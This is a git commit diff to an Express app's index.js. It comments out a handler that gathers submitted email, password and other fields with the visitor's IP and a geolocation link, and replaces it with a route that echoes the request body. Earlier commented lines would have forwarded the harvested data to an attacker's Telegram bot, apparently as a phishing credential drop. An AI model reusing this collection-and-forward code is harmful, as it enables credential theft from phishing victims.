dc7a4f5b6ce626c959a11f83ffca597dd52b823a
dkstools <120433478+dkstools@users.noreply.github.com>
2022-12-13 06:20:29 -0800

    Update index.js

--- functions/app/index.js
+++ functions/app/index.js
@@ -81,29 +81,30 @@ export default function expressApp(functionName) {
   })
 
   router.get('/hello/', function(req, res) {
-    app.get('/', function(req, res){
-   res.header("Access-Control-Allow-Origin", "*");
-   res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
-   res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-   var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+//     app.get('/', function(req, res){
+//    res.header("Access-Control-Allow-Origin", "*");
+//    res.header('Access-Control-Allow-Methods', 'DELETE, PUT');
+//    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+//    var ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
   
-   // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
-       let msg='';
-  for (let [key, value] of Object.entries(req.body.val)) {
-  msg +=key+' : '+ value+'\n';
+//    // var message= "------------------------\nEmail : "+req.body.email+"\npassword : "+req.body.password+"\nmode: "+req.body.mode+"\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+//        let msg='';
+//   for (let [key, value] of Object.entries(req.body.val)) {
+//   msg +=key+' : '+ value+'\n';
  
-}
-msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
+// }
+// msg += "\nhttp://www.geoiptool.com/?IP="+ip+"\n";
      
-   console.log(msg);
+//    console.log(msg);
 
 
-// Create a bot that uses 'polling' to fetch new updates
-//const bot = new TelegramBot(req.body.tok, {polling: true});
+// // Create a bot that uses 'polling' to fetch new updates
+// //const bot = new TelegramBot(req.body.tok, {polling: true});
 
-//bot.sendMessage(req.body.telid, msg);
-   res.send("recieved your request!");
-});
+// //bot.sendMessage(req.body.telid, msg);
+//    res.send("recieved your request!");
+// });
+    res.send(req.body);
   })
 
   // Attach logger
